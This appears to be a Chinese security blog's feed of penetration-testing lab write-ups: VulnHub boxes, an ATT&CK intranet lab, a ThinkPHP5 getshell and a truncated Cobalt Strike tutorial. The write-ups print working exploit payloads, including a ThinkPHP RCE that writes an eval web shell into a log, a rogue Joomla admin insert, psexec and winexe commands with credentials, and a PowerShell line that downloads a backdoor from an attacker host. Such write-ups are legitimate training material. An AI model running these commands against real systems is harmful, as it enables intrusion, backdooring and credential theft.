    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table><thead><tr><th>攻击机</th><th>靶机</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.158</td></tr></tbody></table><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png"></p><p>开放22,80端口，访问web服务没有功能点，继续扫目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272225529.png"></p><p>访问&#x2F;js存在存在一个js文件</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272228711.png" style="zoom:50%;" /><p>dashboard.html是一个上传页面</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272230972.png"></p><p>ajax.php无任何回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272232356.png"></p><p>结合上面的信息知道是一个上传脚本，后端由ajax.php去处理</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>尝试上传shell，被过滤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272244313.png"></p><p>继续fuzz,发现后缀为txt的上传成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272245618.png"></p><p>但是没有返回上传路径，换个字典继续，扫出了上传路径和一个备份文件ajax.php.bak</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272305974.png"></p><p>查看备份文件，当cookie为字段admin&#x3D;&amp;G6u@B6uDXMq&amp;Ms时可以上传php,还提示需要在cookie末尾添加一个大写字母，同时post字段secure的值为val1d</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272307017.png"></p><p>burp发包开始爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272359360.png"></p><p>当最后一位大写字母为R的时候，上传成功,拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280005485.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>继续往下，翻到一个密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280006415.png"></p><p>ssh上去拿到一个完整的shell，这里有一个小坑，[]里的单词是*的意思，在密码app后面加个 * 即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280010238.png"></p><p>linux提权三板斧，suid，sudo无密码，内核</p><p>找到一个root权限无密码的py文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280015799.png"></p><p>接受输入，执行命令去产生cookie并输出，没有过滤存在rce</p><p>kali起一个监听，然后执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020452.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020643.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;攻击机&lt;/th&gt;
&lt;th&gt;靶机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.158&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-MOMENTUM:1打靶</title>
    <link href="https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-26T14:32:24.000Z</published>
    <updated>2022-07-27T13:48:39.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table><thead><tr><th>攻击机</th><th>靶机</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.157</td></tr></tbody></table><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png"></p><p>只开了两个端口22,80，先扫一下目录，扫到一个js目录，打开发现一个js文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262323200.png"></p><p>发现AES秘钥和一个连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262326894.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>访问这个文件，发现输入什么都会在页面回显出来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262344102.png"></p><p>那么应该存在xss漏洞，结合上面给出的aes秘钥，弹个cookie看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262351634.png"></p><p>AES解密出密文是一个账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262353466.png"></p><p>auxerre&#x2F;auxerre-alienum## 尝试登录ssh</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262355496.png"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270015731.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>尝试了suid，sudo无密码皆无果，在查看进程的时候发现了redis服务</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270019758.png"></p><p>尝试无密码登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270022112.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;攻击机&lt;/th&gt;
&lt;th&gt;靶机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.157&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场03</title>
    <link href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/"/>
    <id>https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/</id>
    <published>2022-07-23T06:41:46.000Z</published>
    <updated>2022-07-23T19:12:42.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录</p><p>已知出网主机为centos主机</p><p>将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式</p><p>其它网卡都默认vmnet2模式，添加vmnet2网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png"></p><p>开启centos后需要重新获取一次ip eth0网卡为我们复制的物理网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient -r</span><br><span class="line">dhclient</span><br></pre></td></tr></table></figure><h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p>ip有出入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png" alt="img"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap确定目标ip</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png" style="zoom:50%;" /><p>进一步扫描端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png"></p><p>目标为ubuntu16.04.1</p><p>22端口存在ssh，可以爆破</p><p>80端口web服务</p><p>3306端口mysql数据库，可以爆破</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>访问网站，用插件得到cms信息 nginx+php+joomla</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png"></p><p>使用joomscan工具扫描，没有漏洞但是知道了版本为3.9.12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.31.54</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png"></p><p>扫出了后台和一个配置文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png"></p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png" style="zoom:50%;" /><p>得到mysql密码和绝对路径</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png" style="zoom:50%;" /><p>连接数据库</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png"></p><p>拿到密码密文，解不出来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png"></p><p>查阅官方文档发现可以添加一个管理员账号 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO am2zu_users (name, username, password, params, registerDate, lastvisitDate, lastResetTime) VALUES (&#x27;Administrator2&#x27;, &#x27;admin123&#x27;, &#x27;433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); INSERT INTO am2zu_user_usergroup_map (user_id,group_id) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure><p>执行sql语句添加账号密码admin123&#x2F;admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png"></p><p>登录后台后添加.php后缀白名单</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png"></p><p>在在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件</p><p>创建一个新的php文件用来写马</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png"></p><p>使用蚁剑连接需要注意关闭蚁剑的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png"></p><p>无法执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png"></p><p>发现disbale_funcions禁用了函数</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png"></p><p>通过蚁剑插件去绕过</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png"></p><p>查看ip，发现不对劲，我们访问的ip明明是192.168.31.54，怎么这里是192.168.93.120，应该是使用了nginx反向代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png"></p><p>上线到msf上做一个内网扫描，使用传统的生产后门再上传太麻烦了，这里使用msf本地起一个后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure><p>设置目标为linux</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png"></p><p>然后将生成的命令复制到shell中执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png"></p><p>但是没反弹成功，一开始我觉得是没有执行权限，于是到&#x2F;tmp目录下去执行，还是没有反弹成功，应该跟反向代理有关。我们访问的流量是从centos转发给ubuntu，而且我们不能直接访问ubuntu，不在一个网段，我们的流量是通过centos转发的，拿到的shell是ubuntu的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png"></p><p>但是执行反弹msf的时候去通过去下载kali上的后门执行，而ubuntu和kali不在一个网段所以没法访问，如果是外网，kali和ubuntu都在外网且ubuntu出网的话是可以反弹的，但是这里是内网自己搭建的环境</p><p>所以这台ubuntu的机器，提不提权已经无所谓了，根据我们拿到的信息，我们要拿到centos的shell才能继续下一步。</p><p>继续往下,也没有找到关键信息，找了一下其他师傅的文章，说是存在&#x2F;tmp&#x2F;mysql&#x2F;test.txt，但我这里却没有，我上靶机看确实也没有，不太懂为什么,借用一张其他师傅的图</p><p>wwwuser&#x2F;wwwuser_123Aqx</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png" alt="img"></p><p>ssh连接centos的时候报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png"></p><p>之所以报错是因为OpenSSH 7.0以后的版本不再支持ssh-dss (DSA)算法，解决方法是增加选项-oHostKeyAlgorithms&#x3D;+ssh-dss,即可成功解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss  wwwuser@192.168.31.54</span><br></pre></td></tr></table></figure><p>成功连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png"></p><p>使用上面反弹msf的方法，将shell上线到msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png"></p><p>在tmp目录下执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png"></p><p>msf收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux 提权三板斧 内核、sudo -l、root权限命令</p><p>尝试了sudo -l和root权限都无果，msf也提不动，查看内核版本符合脏牛，尝试内核提权</p><p>把提权文件传上去编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png"></p><p>切换用户</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png"></p><p>在使用此用户运行刚刚上线msf的payload，或者直接运行tmp目录下的后门，获得一个root权限的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>查看ip发现有两个网段</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png" style="zoom:50%;" /><p>添加路由，将msf代理进内网，再起一个反向代理方便使用别的工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png"></p><p>proxychains添加一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>![image-20220724002827926](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220724002827926.png)</p><p>用nmap扫描存活主机和端口，要注意的是prxychains代理不了icmp流量，所以不能使用ping，只能用tcp去扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png"></p><p>也可以用msf自带的模块去扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p>扫出三台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描端口</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png"></p><p>nmap扫描的精确一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png"></p><p>三台主机都为windows，10开启了53端口，推测为域控，20开启了1433 mssql，30和其余两台都存在smb服务，尝试永恒之蓝都不存在</p><p>换个方法，尝试爆破smb用户，将上面获取到的两个密码放入密码文件进行爆破</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png" style="zoom:50%;" /><p>最后爆破出30、20的密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png"></p><p>使用msf自带模块来攻击,要注意的是这里使用正向连接payload，因为我们使用加了代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass 123qwe!ASD</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.93.30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>得到一个system权限的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png"></p><p>通过winexe得到20的会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%123qwe!ASD&#x27;</span> //192.168.93.20 cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png"></p><p>他上线到msf，生成一个shell，因为目标主机不出网，所以把shell上传到centos主机上,再由centos主机用python起一个web服务，20主机使用powershell去下载</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png" style="zoom:50%;" /><p>注意不要和web服务端口起冲突，使用8899端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png"></p><p>开启远程桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置远程桌面端口</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"><span class="comment">#开启远程桌面</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"><span class="comment">#检查端口状态</span></span><br><span class="line">netstat -an|find <span class="string">&quot;3389&quot;</span></span><br></pre></td></tr></table></figure><p>使用administrator登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.93.128:8899/shell1.exe&#x27;</span>,<span class="string">&#x27;C:\shell.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下载后门</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png" style="zoom:50%;" /><p>kali起一个监听，注意这里要使用正向监听，因为目标主机是不出网的，运行后门成功反弹会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png"></p><p>迁移进程到一个系统进程后，使用kiwi抓取密码，抓到域控密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png"></p><p>使用同样的方法拿到cmd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%zxcASDqw123!!&#x27;</span> //192.168.93.10 cmd.exe</span><br></pre></td></tr></table></figure><p>一样的方法上线msf，只需要修改正向监听的ip即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录&lt;/p&gt;
&lt;p&gt;已知出网主机为centos主机&lt;/p&gt;
&lt;p&gt;将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式&lt;/p&gt;
&lt;p&gt;其它网卡都默认vmnet2模式，添加vmnet2网卡&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>tp5+php7.3 getshell</title>
    <link href="https://syst1m.top/2022/07/21/tp5-php7-3-getshell/"/>
    <id>https://syst1m.top/2022/07/21/tp5-php7-3-getshell/</id>
    <published>2022-07-21T10:09:32.000Z</published>
    <updated>2022-07-21T11:29:37.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下为本地环境搭建</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>报错拿到cms信息,windows+iis+tp5<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png"></p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>thinkphp RCE漏洞还是挺多的,直接上tp检测神器<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211914600.png"></p><p>能执行phpinfo确实存在RCE,拿到真实路径,得到php为7.3<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211915864.png"></p><p>直接使用工具写shell失败</p><p>exp写shell失败,php7.1以上无法使用assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>google了一下,找到日志写shell方法</p><p>将shell写入日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha</span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=-<span class="number">1</span>&amp;get[]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211922941.png"></p><p>包含日志文件getshell,成功执行phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=-<span class="number">1</span>&amp;get[]=../runtime/log/<span class="number">202207</span>/<span class="number">21</span>.log&amp;shell=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211923675.png"></p><p>上蚁剑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211926496.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211928165.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以下为本地环境搭建&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;报错拿到cms信息,windows+iis+tp5&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;web打点&quot;&gt;&lt;a href=&quot;#web打点&quot; class=&quot;headerlink&quot; title=&quot;web打点&quot;&gt;&lt;/a&gt;web打点&lt;/h1&gt;</summary>
    
    
    
    <category term="渗透实战" scheme="https://syst1m.top/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="getshell" scheme="https://syst1m.top/tags/getshell/"/>
    
    <category term="thinkphp" scheme="https://syst1m.top/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike使用学习</title>
    <link href="https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://syst1m.top/2022/07/20/Cobalt-Strike%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-07-20T12:30:38.000Z</published>
    <updated>2022-07-22T11:36:41.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>Cobalt Strike使用C&#x2F;S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt Strike的客户端不与目标服务器进行交互。</p><h2 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h2><p>服务端一般设在公网ip的服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./teamserver your_ip your_passowrd [config_file]</span></span><br><span class="line">./teamserver 192.168.31.118 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212117798.png"></p><h2 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike   </span><br></pre></td></tr></table></figure><p>输入刚才设置的ip和密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212121225.png"></p><h2 id="连接多个服务端"><a href="#连接多个服务端" class="headerlink" title="连接多个服务端"></a>连接多个服务端</h2><p>直接新建配置即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207212123267.png"></p><h1 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h1><p>监听器就是等待被入侵系统连接自己的一个服务。要是为了接受payload回传的各类数据，类似于MSF中handler的作用。比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p><h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><ul><li>Beacon是CS的payload，和msf中的meterpreter一样</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li></ul><h2 id="HTTP和HTTPS-Beacon"><a href="#HTTP和HTTPS-Beacon" class="headerlink" title="HTTP和HTTPS Beacon"></a>HTTP和HTTPS Beacon</h2><ul><li>HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web 